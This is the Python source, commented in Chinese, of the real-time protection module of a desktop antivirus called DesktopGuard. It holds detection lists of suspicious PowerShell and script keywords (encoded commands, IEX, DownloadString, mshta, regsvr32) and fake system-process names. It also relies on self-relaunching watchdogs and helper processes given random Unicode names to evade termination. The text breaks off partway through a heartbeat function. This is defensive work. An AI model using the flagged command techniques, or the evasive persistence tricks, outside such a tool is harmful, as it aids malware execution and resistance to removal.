# -*- coding: utf-8 -*-
"""
DesktopGuard 轻量实时防护模块
================================
功能：
1. 后台线程每5秒扫描进程列表（进程监控）
2. 识别可疑进程（Temp路径、伪装系统进程、可疑命令行等）
3. 【C++ 文件监控】dg_monitor.exe 基于 ReadDirectoryChangesW 毫秒级捕获
   高风险目录中的新增/修改可执行文件，立即扫描告警
4. 文件监控进程心跳保活：被杀后自动重新拉起（防护自愈）
5. 发现高危进程/文件通过queue发送告警到主线程
6. 支持暂停/恢复/停止

注意：这是轻量防护方案，不是内核级实时拦截。
"""

from paths import DATA_DIR
import os
import sys
import re
import json
import time
import threading
import subprocess
import queue
import shutil
from datetime import datetime

# 隐藏命令行窗口标志（避免wmic/tasklist弹出黑窗闪烁）
CREATE_NO_WINDOW = 0x08000000
def _is_installer_temp(low_path):
    """NSIS 安装器解压目录 Temp 下 nsXXXX.tmp 与 PyInstaller 运行时释放目录 Temp 下 _MEI*。
    安装/解压软件时释放的组件不参与批量落盘判定与自动隔离，避免 WinError 5 误报。"""
    return ("\\temp\\ns" in low_path and ".tmp\\" in low_path) or ("\\temp\\_mei" in low_path)


class RealTimeProtector:
    """轻量实时防护器：后台轮询进程，发现可疑进程告警。"""
    
    def __init__(self, alert_queue=None, config_path=None):
        self._ai_analyze_at = 0.0  # 4.5.0：AI 行为分析节流时间戳（每分钟最多1次）
        """
        Args:
            alert_queue: queue.Queue，用于向主线程发送告警
            config_path: 配置文件路径，默认 ~/.desktopguard/rtp_config.json
        """
        self.alert_queue = alert_queue or queue.Queue()
        self.config_path = config_path or os.path.join(
            DATA_DIR, "rtp_config.json"
        )
        
        # 状态
        self.running = False
        self.paused = False
        self._thread = None
        self._stop_event = threading.Event()
        
        # 统计
        self.scan_count = 0
        self.alert_count = 0
        self.intercept_count = 0  # 3.4.0 进程拦截计数
        self._last_killed_alert = 0.0  # 3.5.0 被杀恢复提示冷却
        self.last_scan_time = None
        
        # 已告警进程（避免重复弹窗），key=进程名+路径，value=告警时间
        self._alerted_processes = {}
        self._alert_cooldown = 300  # 同一进程5分钟内不重复告警
        # 4.4.0 行为链引擎：父进程缓存（pid → proc），供行为链评分查询"谁启动了它"
        self._parent_cache = {}

        # ---- C++ 文件事件监控（dg_monitor.exe） ----
        self._monitor_proc = None          # dg_monitor 子进程
        self._file_thread = None           # 文件事件读取线程
        self._file_stop = threading.Event()
        self._events_file = os.path.join(DATA_DIR, "monitor_events.jsonl")
        self._heartbeat_file = os.path.join(DATA_DIR, "monitor_heartbeat.txt")
        self._events_offset = 0            # 增量读取偏移
        self._alerted_files = {}           # 已告警文件（避免重复），key=路径
        self._file_alert_cooldown = 600    # 同一文件10分钟内不重复告警
        # ---- 批量落盘行为检测（防乱码轰炸/下载器/蠕虫批量写文件） ----
        self._recent_adds = []             # [(time, path)] 最近新增文件时间戳队列
        self._batch_window = 30            # 检测窗口：30秒
        self._batch_threshold = 5          # 窗口内新增脚本/可执行文件 >=5 触发
        self._batch_alert_at = 0.0         # 上次批量告警时间（防刷屏）
        self._monitor_dirs = self._default_monitor_dirs()
        self._monitor_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dg_monitor.exe")
        # ---- C++ 守护进程（dg_guard.exe 看门狗） ----
        self._guard_proc = None
        self._guard_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dg_guard.exe")
        self._guard_backup_dir = os.path.join(DATA_DIR, "guard_backup")
        self._guard_hb = os.path.join(DATA_DIR, "guard_heartbeat.txt")
        self._guard_stop_flag = os.path.join(DATA_DIR, "guard_stop.flag")
        # ---- 4.4.2 乱码观察者（用户态自保最后防线） ----
        self._watcher_procs = []                    # 当前乱码观察者子进程
        self._watcher_tpl = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dg_watcher_tpl.exe")
        self._watcher_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "watchers")
        self._watcher_cfg = os.path.join(DATA_DIR, "watcher_config.txt")
        self._main_heartbeat_file = os.path.join(DATA_DIR, "main_heartbeat.txt")  # 观察者判断主程序死活的心跳
        self._main_heartbeat_stop = threading.Event()
        # 3.5.8：三方互守已闭环（dg_guard 守 pythonw+monitor，monitor 守 guard，pythonw 守 guard），
        # 双看门狗并发拉起会造成主程序双实例，已回滚
        self._rtp_start_time = time.time()  # 假死自愈启动宽限
        self._last_guard_restart = 0.0   # 守护重启冷却（秒）
        self._last_monitor_restart = 0.0 # 文件监控重启冷却（秒）
        self._monitor_lock = threading.Lock()   # 文件监控启动互斥
        self._guard_lock = threading.Lock()     # 守护启动互斥
        
        # 加载配置
        self.config = self._load_config()
        
        # 可疑进程名模式（伪装系统进程）
        self._suspicious_name_patterns = [
            (r'svch0st\.exe', '伪装系统进程 svchost.exe'),
            (r'expl0rer\.exe', '伪装系统进程 explorer.exe'),
            (r'ls4ss\.exe', '伪装系统进程 lsass.exe'),
            (r'csrs5\.exe', '伪装系统进程 csrss.exe'),
            (r'winl0gon\.exe', '伪装系统进程 winlogon.exe'),
            (r'smss5\.exe', '伪装系统进程 smss.exe'),
            (r'chrome_upd[a-z]*\.exe', '疑似Chrome更新伪装'),
            (r'windows_update[a-z]*\.exe', '疑似Windows更新伪装'),
            (r'security_[a-z]*\.exe', '疑似安全软件伪装'),
        ]
        
        # 可疑命令行关键词
        self._suspicious_cmd_keywords = [
            ('-enc', 'PowerShell编码执行'),
            ('-EncodedCommand', 'PowerShell编码命令'),
            ('bypass', '绕过执行策略'),
            ('hidden', '隐藏窗口执行'),
            ('FromBase64String', 'Base64解码执行'),
            ('IEX(', 'Invoke-Expression执行'),
            ('Invoke-Expression', 'Invoke-Expression执行'),
            ('DownloadString', '远程下载执行'),
            ('downloadstring', '远程下载执行'),
            ('/c ', '命令行执行（cmd /c）'),
            ('mshta', 'HTML应用程序执行'),
            ('wscript', '脚本执行'),
            ('cscript', '脚本执行'),
            ('regsvr32', 'COM组件注册（可能用于白名单绕过）'),
        ]
        
        # 高风险路径关键词
        self._risky_path_keywords = [
            r'\\temp\\',
            r'\\tmp\\',
            r'\\appdata\\local\\temp\\',
            r'\\appdata\\roaming\\',
            r'\\downloads\\',
            r'\\desktop\\',
            r'\\recycle\.bin\\',
        ]
    
    def _default_monitor_dirs(self):
        """默认监控的高风险目录（下载/桌面/启动/Temp/AppData Roaming）。"""
        user = os.path.expanduser("~")
        program_data = os.environ.get("ProgramData", r"C:\ProgramData")
        dirs = []
        candidates = [
            os.path.join(user, "Downloads"),
            os.path.join(user, "Desktop"),
            os.path.join(user, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
            os.path.join(program_data, "Microsoft", "Windows", "Start Menu", "Programs", "StartUp"),
            os.path.join(user, "AppData", "Local", "Temp"),
            os.path.join(user, "AppData", "Roaming"),
            os.path.join(user, "AppData", "Local", "Temp"),
        ]
        for d in candidates:
            if os.path.isdir(d) and d not in dirs:
                dirs.append(d)
        # 配置覆盖
        cfg_dirs = self.config.get("monitor_dirs") if hasattr(self, "config") else None
        if cfg_dirs:
            return [d for d in cfg_dirs if os.path.isdir(d)] or dirs
        return dirs

    def _load_config(self):
        """加载配置。"""
        default_config = {
            "enabled": True,
            "scan_interval": 5,  # 扫描间隔（秒）
            "alert_on_suspicious_name": True,
            "alert_on_suspicious_cmd": True,
            "alert_on_risky_path": True,
            "alert_on_unsigned_exe": False,  # 默认关闭，误报太多
            "auto_kill_high_risk": False,  # 兼容旧配置：手动模式
            "process_intercept": True,     # 3.4.0 进程拦截总开关（高危自动拦截）
            "intercept_dg_tamper": True,   # 3.4.0 保护 DG 自身：攻击进程自动拦截
            "intercept_adversarial_av": True,  # 3.5.0 对抗性杀软拦截（PyAS 等）
            "notify_killed_restore": True,     # 3.5.0 被杀恢复提示
            "whitelist": [],  # 白名单进程名
        }
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, "r", encoding="utf-8") as f:
                    cfg = json.load(f)
                default_config.update(cfg)
        except Exception:
            pass
        return default_config
    
    def save_config(self):
        """保存配置。"""
        try:
            os.makedirs(os.path.dirname(self.config_path), exist_ok=True)
            with open(self.config_path, "w", encoding="utf-8") as f:
                json.dump(self.config, f, ensure_ascii=False, indent=2)
        except Exception:
            pass
    
    def start(self):
        """启动实时防护。"""
        if self.running:
            return
        self.running = True
        self._rtp_start_time = time.time()
        # 启动时清理残留 GUI 心跳（避免新进程被旧文件误导）
        try:
            hb = os.path.join(DATA_DIR, "app_heartbeat.txt")
            if os.path.exists(hb):
                os.remove(hb)
        except Exception:
            pass
        # 清理残留的 dg_guard/dg_monitor 与 stop flag（防止多实例爆炸）
        try:
            if os.path.exists(self._guard_stop_flag):
                os.remove(self._guard_stop_flag)

        except Exception:
            pass
        try:
            subprocess.run(["taskkill", "/F", "/IM", "dg_guard.exe"],
                           capture_output=True, creationflags=CREATE_NO_WINDOW)
            subprocess.run(["taskkill", "/F", "/IM", "dg_monitor.exe"],
                           capture_output=True, creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass
        self.paused = False
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True, name="DG-RTP")
        self._thread.start()
        # 启动 C++ 文件事件监控
        self._start_file_monitor()
        # 【3.5.8】系统文件守护：防御删 System32 核心文件型病毒
        self._start_system_guard()
        self._log("实时防护已启动（进程监控 + C++文件事件监控 + 系统文件守护）")
    
    def stop(self):
        """停止实时防护。"""
        self.running = False
        self._stop_event.set()
        self._file_stop.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3)
        if self._file_thread and self._file_thread.is_alive():
            self._file_thread.join(timeout=3)
        self._stop_file_monitor()
        try:
            if self._sys_guard_stop:
                self._sys_guard_stop.set()
        except Exception:
            pass
        try:
            subprocess.run(["taskkill", "/F", "/IM", "dg_guard.exe"],
                           capture_output=True, creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass
        self._log("实时防护已停止")
    
    # ---------- 【3.5.8】系统文件守护 ----------
    def _start_system_guard(self):
        """防御删 System32 核心文件型病毒：备份 + 轮询 + 还原 + 紧急告警。
        纯本地逻辑，断网照常工作。"""
        try:
            if getattr(self, "_sys_guard_stop", None) is None:
                self._sys_guard_stop = threading.Event()
            if getattr(self, "_sys_guard_thread", None) is not None and self._sys_guard_thread.is_alive():
                return
            import system_guard as _sg
            self._sys_guard_thread = _sg.start_system_guard(
                self.alert_queue, self._sys_guard_stop, log_fn=self._log)
        except Exception:
            self._log("系统文件守护启动失败")

    def pause(self):
        """暂停。"""
        self.paused = True
        self._log("实时防护已暂停")
    
    def resume(self):
        """恢复。"""
        self.paused = False
        self._log("实时防护已恢复")
    
    # ---------- C++ 文件事件监控 ----------
    def _system_dg_monitor_running(self):
        """4.5.1：系统是否已有同路径 dg_monitor 实例（dg_guard 可能已拉起）→ 防双实例。"""
        try:
            out = subprocess.run(
                ["wmic", "process", "where", "name='dg_monitor.exe'", "get", "ExecutablePath", "/format:csv"],
                capture_output=True, text=True, encoding="gbk", errors="ignore",
                timeout=5, creationflags=CREATE_NO_WINDOW
            )
            for line in out.stdout.splitlines():
                if "dg_monitor.exe" in line and self._monitor_exe.lower() in line.lower():
                    return True
        except Exception:
            pass
        return False

    def _start_file_monitor(self):
        """启动 dg_monitor.exe（无黑窗）+ 事件读取线程。互斥+防重复。"""
        with self._monitor_lock:
            try:
                if not os.path.exists(self._monitor_exe):
                    self._log("dg_monitor.exe 不存在，文件监控不可用")
                    return
                # 已有监控在跑且线程健康 → 不重复启动
                if (self._monitor_proc is not None and self._monitor_proc.poll() is None
                        and self._file_thread is not None and self._file_thread.is_alive()):
                    return
                # 4.5.1：系统已有同路径 dg_monitor（dg_guard 拉起/维护中）→ 复用，不重复启动
                if self._system_dg_monitor_running():
                    self._monitor_proc = None
                    try:
                        self._events_offset = os.path.getsize(self._events_file) if os.path.exists(self._events_file) else 0
                    except Exception:
                        self._events_offset = 0
                    self._file_stop.clear()
                    self._file_thread = threading.Thread(target=self._file_monitor_loop, daemon=True, name="DG-FMON")
                    self._file_thread.start()
                    return
                # 终止旧的事件读取线程（避免 join 当前线程）
                if (self._file_thread is not None and self._file_thread.is_alive()
                        and threading.current_thread() is not self._file_thread):
                    self._file_stop.set()
                    self._file_thread.join(timeout=2)
                elif self._file_thread is not None and                         threading.current_thread() is self._file_thread:
                    # 当前线程就是 loop 线程：不 join 自己，仅置空引用让新线程接管
                    self._file_stop.set()
                os.makedirs(os.path.dirname(self._events_file), exist_ok=True)
                # 清空旧事件
                try:
                    if os.path.exists(self._events_file):
                        os.remove(self._events_file)
                except Exception:
                    pass
                self._events_offset = 0
                self._file_stop.clear()
                # 目录参数用 ; 分隔（避免与 dg_guard targets 的 | 冲突）
                dirs_arg = ";".join(self._monitor_dirs)
                # 删除旧心跳文件（避免新进程启动前被误判超时）
                try:
                    if os.path.exists(self._heartbeat_file):
                        os.remove(self._heartbeat_file)
                except Exception:
                    pass
                # 3.5.1 参数扩展：+pythonw路径 +main.py路径 +exit_flag（dg_monitor 三方互守第三环）
                _base_dir = os.path.dirname(os.path.abspath(__file__))
                _pyw_exe = sys.executable.replace("python.exe", "pythonw.exe")
                _main_py = os.path.join(_base_dir, "main.py")
                _exit_flag = os.path.join(DATA_DIR, "app_exit.flag")
                self._monitor_proc = subprocess.Popen(
                    [self._monitor_exe, dirs_arg, self._events_file, self._heartbeat_file,
                     str(os.getpid()), _pyw_exe, _main_py, _exit_flag],
                    creationflags=CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                # 等待 dg_monitor 写入首次心跳（消除启动竞态，最多 3 秒）
                for _ in range(30):
                    try:
                        if os.path.exists(self._heartbeat_file) and                                 time.time() - os.path.getmtime(self._heartbeat_file) < 3:
                            break
                    except Exception:
                        pass
                    time.sleep(0.1)
                self._file_thread = threading.Thread(target=self._file_monitor_loop, daemon=True, name="DG-FMON")
                self._file_thread.start()
                self._start_guard(dirs_arg)
                self._last_monitor_restart = time.time()  # 重置冷却，避免启动即触发心跳检查
                self._log(f"文件事件监控已启动（{len(self._monitor_dirs)} 个目录，毫秒级）")
                self._start_watchers()
                threading.Thread(target=self._main_heartbeat_loop, daemon=True).start()
            except Exception as e:
                self._log(f"启动文件监控失败: {e}")

    def _start_guard(self, dirs_arg):
        """启动 dg_guard.exe 守护 dg_monitor（被杀自动拉起 + 文件自恢复）。"""
        with self._guard_lock:
            try:
                if not os.path.exists(self._guard_exe):
                    self._log("dg_guard.exe 不存在，守护不可用")
                    return
                # 已有守护在跑则跳过（防重复启动）
                if self._guard_proc is not None and self._guard_proc.poll() is None:
                    return
                os.makedirs(self._guard_backup_dir, exist_ok=True)
                # 清理 stop flag
                if os.path.exists(self._guard_stop_flag):
                    os.remove(self._guard_stop_flag)
                # 目标1：dg_monitor.exe（dg_guard 用相同参数重启它）
                monitor_target = f"{self._monitor_exe}@@{dirs_arg}|{self._events_file}|{self._heartbeat_file}|{os.getpid()}"
                # 目标2：pythonw（心跳）三方互守 —— DG 主程序被杀/崩溃时由 dg_guard 拉回；
                #        正常关闭（写 app_exit.flag）时不拉回
                base_dir = os.path.dirname(os.path.abspath(__file__))
                exit_flag = os.path.join(DATA_DIR, "app_exit.flag")
                pyw_exe = sys.executable.replace("python.exe", "pythonw.exe")
                if os.path.exists(pyw_exe):
                    # 3.5.8: 拉回主程序不传 --tray → 显示主窗口，用户能看到 DG 已恢复
                    pyw_target = f"{pyw_exe}@@main.py@@{base_dir}@@{exit_flag}"
                    guard_targets = monitor_target + "||" + pyw_target
                else:
                    guard_targets = monitor_target
                self._guard_proc = subprocess.Popen(
                    [self._guard_exe, guard_targets, self._guard_backup_dir,
                     self._guard_hb, self._guard_stop_flag],
                    creationflags=CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                self._last_guard_restart = time.time()  # 重置冷却
                self._log("守护进程 dg_guard 已启动（毫秒级拉起 dg_monitor）")
            except Exception as e:
                self._log(f"启动守护失败: {e}")

    def _stop_watchers(self):
        """4.4.2 清理全部乱码观察者：按 watchers 目录的 exe 结束进程 + 删除旧文件。
        用 ExecutablePath 匹配（避免乱码文件名在命令行/编码上的坑）。"""
        try:
            if not os.path.isdir(self._watcher_dir):
                return
            try:
                subprocess.run(
                    ['powershell', '-NoProfile', '-Command',
                     "Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -like '*watchers*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"],
                    capture_output=True, timeout=15, creationflags=CREATE_NO_WINDOW)
            except Exception:
                pass
            import time as _t
            _t.sleep(0.5)  # 等进程退出，文件解锁
            for fn in os.listdir(self._watcher_dir):
                if fn.lower().endswith(".exe"):
                    try:
                        os.remove(os.path.join(self._watcher_dir, fn))
                    except Exception:
                        pass
        except Exception:
            pass

    def _start_watchers(self):
        """4.4.2 启动乱码观察者（最后防线）：
        复制模板为 2 个随机 Unicode 乱码名 exe 并启动；进程名随机、病毒无法按名定位。
        观察者逻辑：主程序被异常终止（无 app_exit.flag）→ 拉回主程序（显示主窗口，用户可见恢复）。
        CPU≈0（2 秒轮询 + 心跳写文件）。"""
        try:
            if not os.path.exists(self._watcher_tpl):
                self._log("dg_watcher_tpl.exe 不存在，乱码观察者不可用")
                return
            os.makedirs(self._watcher_dir, exist_ok=True)
            # 清理旧观察者（杀残留进程+删旧文件），再重建，避免累积
            self._stop_watchers()
            import random as _r
            def _garbled():
                # 生僻 Unicode 组合：特殊字母 + CJK 扩展B + 藏文等，确保"难打出来"且不重复
                rare = "ᵈᵍᵂᵃᵗᶜʰᵉʳᵦᵧᵨᵩᵪᶫᶬᶮᶯᶰᶱᶲᶳᶴᵝᵞᵟᵠ"
                cjk = "𠀀𠀁𠀂𠀃𠀄𠀅𠀆𠀇𠀈𠀉𠀊𠀋𠀌𠀍𠀎𠀏"
                tib = "ཀཁགགྷངཅཆཇཉཊཋཌཌྷཎཏ"
                pools = [rare, cjk, tib]
                name = "".join(_r.choice(_r.choice(pools)) for _ in range(_r.randint(6, 10)))
                for c in '\\/:*?"<>|':
                    name = name.replace(c, "")
                return name or "ᵈᵍ"
            # 写观察者配置：launch 不带 --tray → 拉回时显示主窗口（用户能看到 DG 已恢复）
            base_dir = os.path.dirname(os.path.abspath(__file__))
            pyw_exe = sys.executable.replace("python.exe", "pythonw.exe")
            launch = '"%s" "%s"' % (pyw_exe, os.path.join(base_dir, "main.py"))
            try:
                with open(self._watcher_cfg, "w", encoding="utf-8") as f:
                    f.write("launch=%s\n" % launch)
                    f.write("main_pid=%d\n" % os.getpid())
            except Exception:
                pass
            # 复制模板为乱码名并启动
            procs = []
            for _ in range(2):
                exe_path = os.path.join(self._watcher_dir, _garbled() + ".exe")
                try:
                    shutil.copy2(self._watcher_tpl, exe_path)
                    p = subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW,
                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    procs.append(p)
                except Exception:
                    pass
            self._watcher_procs = procs
            self._log("乱码观察者已启动（%d 个，进程名随机 Unicode，最后防线，CPU≈0）" % len(procs))
        except Exception as e:
            self._log("启动乱码观察者失败: %s" % e)

    def _main_heartbeat_loop(self):
        """4.4.2 主程序心跳：每 5 秒刷新 main_heartbeat.txt 的 mtime，
        乱码观察者据此判断主程序是否存活（不依赖固定 PID，避免拉回乒乓）。"""
        while not self._main_heartbeat_stop.is_set():
            try:
                with open(self._main_heartbeat_file, "w") as f:
                    f.write("%d\n" % int(time.time()))
            except Exception:
                pass
            self._main_heartbeat_stop.wait(5)

    def _stop_guard(self):
        """停止 dg_guard（创建 stop flag 优雅退出 + 强杀兜底）。"""
        try:
            # stop flag 让 dg_guard 优雅退出
            try:
                os.makedirs(os.path.dirname(self._guard_stop_flag), exist_ok=True)
                with open(self._guard_stop_flag, "w") as f:
                    f.write("stop")
            except Exception:
                pass
            if self._guard_proc and self._guard_proc.poll() is None:
                try:
                    self._guard_proc.terminate()
                    self._guard_proc.wait(timeout=2)
                except Exception:
                    try:
                        self._guard_proc.kill()
                    except Exception:
                        pass
        except Exception:
            pass
        self._guard_proc = None

    def _check_guard_heartbeat(self):
        """守护进程心跳：dg_guard 超过 15 秒未更新或进程已退出 → 重启（带 20 秒冷却防抖）。"""
        try:
            now = time.time()
            # 3.3.2：守护进程已退出 → 直接重启，不再依赖心跳文件存在与否
            guard_gone = (self._guard_proc is None) or (self._guard_proc.poll() is not None)
            if guard_gone:
                if (now - self._last_guard_restart > 20
                        and self.config.get('enabled', True) and not self.paused):
                    self._last_guard_restart = now
                    self._log('守护进程已退出，自动重启')
                    self._notify_killed("守护进程 dg_guard")
                    self._start_guard(';'.join(self._monitor_dirs))
                return
            if not os.path.exists(self._guard_hb):
                return
            mtime = os.path.getmtime(self._guard_hb)
            if now - mtime > 15 and now - self._last_guard_restart > 20:
                self._last_guard_restart = now
                if self._guard_proc and self._guard_proc.poll() is None:
                    try:
                        self._guard_proc.terminate()
                        self._guard_proc.wait(timeout=2)
                    except Exception:
                        try:
                            self._guard_proc.kill()
                        except Exception:
                            pass
                self._guard_proc = None
                self._log("守护进程心跳超时，自动重启")
                self._start_guard(";".join(self._monitor_dirs))
        except Exception:
            pass

    def _notify_killed(self, what):
        """【3.5.0】检测到 DG 进程被外部终止并自动恢复 → 提示用户（5 分钟冷却）。
        启动 30 秒内不提示（避免自清理/重启误报）。"""
        try:
            if not self.config.get("notify_killed_restore", True):
                return
            if time.time() - self._rtp_start_time < 30:
                return
            now = time.time()
            if now - self._last_killed_alert < 300:
                return
            self._last_killed_alert = now
            self._log(f"检测到进程被外部终止并已自动恢复: {what}")
            try:
                self.alert_queue.put({
                    "type": "process_killed",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "what": what,
                })
            except Exception:
                pass
        except Exception:
            pass

    def _check_app_heartbeat(self):
        """GUI 心跳检测（假死自愈）：主程序主线程 45 秒未更新 app_heartbeat.txt
        → 判定 GUI 假死/未响应 → 强制结束本进程 → dg_guard 立即拉回，GUI 原地复活。
        RTP 运行在独立线程，主线程卡死不影响本检测。
        启动宽限 40 秒：进程刚被拉回时 GUI 还没开始写心跳，且残留旧心跳文件，
        必须等 GUI 稳定后再启用检测，否则会误杀导致循环重启。
        阈值 45 秒：GUI 短暂繁忙（处理文件事件/AI 分析）不会触发，真死锁才重启。"""
        try:
            if time.time() - self._rtp_start_time < 40:
                return
            hb = os.path.join(DATA_DIR, "app_heartbeat.txt")
            if not os.path.exists(hb):
                return
            if time.time() - os.path.getmtime(hb) > 45:
                self._log("GUI 心跳超时（疑似未响应），强制重启主程序（假死自愈）")
                try:
                    # os.kill 用真实 PID 打开进程并 TerminateProcess，比 ctypes 伪句柄可靠
                    os.kill(os.getpid(), 9)
                except Exception:
                    os._exit(1)
        except Exception:
            pass

    def _stop_file_monitor(self):
        """停止 dg_guard + dg_monitor 进程（先停守护再停目标，避免自动拉起）。"""
        self._stop_guard()
        if self._monitor_proc and self._monitor_proc.poll() is None:
            try:
                self._monitor_proc.terminate()
                self._monitor_proc.wait(timeout=3)
            except Exception:
                try:
                    self._monitor_proc.kill()
                except Exception:
                    pass
        self._monitor_proc = None
        # 兜底：杀干净所有残留 dg_monitor（含 dg_guard 最后拉起的实例）
        try:
            subprocess.run(["taskkill", "/F", "/IM", "dg_monitor.exe"],
                           capture_output=True, creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass

    def _file_monitor_loop(self):
        """后台线程：增量读取事件文件 + 心跳保活。"""
        while not self._file_stop.is_set():
            try:
                if self.paused or not self.config.get("enabled", True):
                    self._file_stop.wait(timeout=2)
                    continue
                self._read_new_events()
                self._check_heartbeat()
                self._check_guard_heartbeat()
                self._check_app_heartbeat()
            except Exception:
                pass
            self._file_stop.wait(timeout=1)

    def _read_new_events(self):
        """增量读取事件文件，处理新事件。"""
        try:
            if not os.path.exists(self._events_file):
                return
            size = os.path.getsize(self._events_file)
            if size <= self._events_offset:
                self._events_offset = size
                return
            with open(self._events_file, "r", encoding="utf-8", errors="ignore") as f:
                f.seek(self._events_offset)
                new_data = f.read()
                self._events_offset = f.tell()
            for line in new_data.splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    evt = json.loads(line)
                    self._handle_file_event(evt)
                except Exception:
                    continue
        except Exception:
            pass


    def _track_batch_add(self, fpath):
        """批量落盘行为检测：窗口内新增多个脚本/可执行文件 -> 疑似蠕虫/下载器批量落盘。
        触发后对这批文件批量告警，由主线程逐个扫描并隔离高危项。"""
        try:
            now = time.time()
            low = fpath.lower()
            # 只统计脚本/可执行类后缀（乱码轰炸/下载器最爱用的）
            exec_suffix = (".vbs", ".vbe", ".ps1", ".js", ".jse", ".wsf",
                           ".bat", ".cmd", ".hta", ".exe", ".dll", ".scr",
                           ".com", ".cpl", ".ocx", ".py", ".pyw", ".reg")
            if not low.endswith(exec_suffix):
                return
            # 3.5.5：NSIS/PyInstaller 安装器解压目录豁免（装软件不触发批量落盘）
            if _is_installer_temp(low):
                return
            # 清理过期记录
            self._recent_adds = [(t, p) for t, p in self._recent_adds
                                 if now - t <= self._batch_window]
            self._recent_adds.append((now, fpath))
            # 窗口内数量达到阈值
            if len(self._recent_adds) < self._batch_threshold:
                return
            # 冷却：同一批次窗口 60 秒内只告警一次
            if now - self._batch_alert_at < 60:
                return
            self._batch_alert_at = now
            paths = [p for _, p in self._recent_adds]
            self._log(f"批量落盘检测: {len(paths)} 秒内新增 {len(paths)} 个脚本/可执行文件")
            try:
                self.alert_queue.put({
                    "type": "batch_alert",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "paths": paths,
                    "count": len(paths),
                })
            except Exception:
                pass
        except Exception:
            pass

    def _file_behavior_score(self, fpath):
        """【4.4.1 行为链引擎→文件事件流】对落盘文件打行为分（0-100）。
        位置+类型+伪装 三维度：规则不认识的"可疑落盘"也能兜底预评分。
        返回 (score, tags)。"""
        try:
            score = 0
            tags = []
            low = (fpath or "").lower()
            # 1. 位置维度
            risky = ("\\temp\\", "\\appdata\\local\\temp", "\\appdata\\roaming\\",
                     "\\downloads\\", "\\desktop\\", "\\startup\\",
                     "\\programdata\\microsoft\\windows\\start menu",
                     "\\users\\public\\")
            if any(p in low for p in risky):
                score += 35
                tags.append("高风险目录落盘")
            # 2. 类型维度
            script = (".vbs", ".vbe", ".ps1", ".js", ".jse", ".wsf",
                      ".hta", ".bat", ".cmd", ".py", ".pyw")
            execf = (".exe", ".dll", ".scr", ".com", ".cpl", ".ocx")
            if low.endswith(script):
                score += 35
                tags.append("脚本类文件")
            elif low.endswith(execf):
                score += 25
                tags.append("可执行文件")
            # 3. 伪装双扩展名（xx.exe.exe / xx.pdf.exe / xx.txt.vbs 绕过手法）
            import re as _re
            if _re.search(r"\.(exe|scr|bat|cmd|vbs|ps1)\.[a-z0-9]{1,4}$", low) or \
               _re.search(r"\.(pdf|jpg|png|docx|xlsx|txt)\.(exe|scr|bat|cmd|vbs|ps1)$", low):
                score += 30
                tags.append("伪装双扩展名")
            # 4. 组合叠加：高风险目录 + 可执行/脚本 → 再升级
            if tags and score >= 60:
                score = min(100, score + 10)
            # 5.3.0 防护模式因子（compatible 降敏 / strong 收紧，标准不变）
            try:
                _pm = str(self.config.get("protection_mode", "standard"))
                if _pm == "compatible":
                    score = max(0, score - 15)
                elif _pm == "strong":
                    score = min(100, score + 15)
            except Exception:
                pass
            return score, tags
        except Exception:
            return 0, []

    def _handle_file_event(self, evt):
        """处理单个文件事件：added/modified → 扫描 → 高危告警。"""
        fpath = evt.get("p", "")
        etype = evt.get("e", "")
        if not fpath or not os.path.exists(fpath):
            return
        # 只关注新增/修改（removed 无需处理）
        if etype not in ("added", "modified"):
            return
        # 批量落盘行为检测：统计窗口内新增的脚本/可执行文件数量
        if etype == "added":
            self._track_batch_add(fpath)
        # 冷却检查
        low = fpath.lower()
        now = time.time()
        if low in self._alerted_files:
            if now - self._alerted_files[low] < self._file_alert_cooldown:
                return
        self._alerted_files[low] = now
        # 清理过期记录
        expired = [k for k, v in self._alerted_files.items() if now - v > self._file_alert_cooldown * 2]
        for k in expired:
            del self._alerted_files[k]
        # 4.4.1 文件行为链评分：位置+类型+伪装 → 预评分附加告警
        bscore, btags = self._file_behavior_score(fpath)
        # 发送文件告警到主线程（由主线程扫描/弹窗，行为链分数作为预评分参考）
        try:
            self.alert_queue.put({
                "type": "file_alert",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "path": fpath,
                "event": etype,
                "max_level": "medium",  # 具体风险等级由主线程扫描后确定
                "behavior_score": bscore,
                "behavior_tags": btags,
            })
        except Exception:
            pass
        # 行为链入库（文件事件，≥55 记录）
        if bscore >= 55:
            self._log_behavior_chain(
                {"pid": 0, "name": os.path.basename(fpath), "path": fpath, "cmd": ""},
                bscore, btags, "文件行为链：" + ("；".join(btags) if btags else "无标签"),
                "high" if bscore >= 80 else "medium")
        self._log(f"文件事件: {etype} {os.path.basename(fpath)} [行为链{bscore}分]")

    def _check_heartbeat(self):
        """心跳保活：dg_monitor 超过 12 秒未更新心跳或进程已退出 → 重启（带 20 秒冷却防抖）。"""
        try:
            now = time.time()
            # 3.3.2：进程已退出（句柄结束）→ 直接重启，不再依赖心跳文件存在与否
            proc_gone = (self._monitor_proc is None) or (self._monitor_proc.poll() is not None)
            if proc_gone:
                if (now - self._last_monitor_restart > 20
                        and self.config.get('enabled', True) and not self.paused):
                    # 4.5.1：系统已有同路径实例（dg_guard 维护）→ 不重复拉起
                    if self._system_dg_monitor_running():
                        self._monitor_proc = None
                        return
                    self._last_monitor_restart = now
                    self._log('文件监控进程已退出，自动重启')
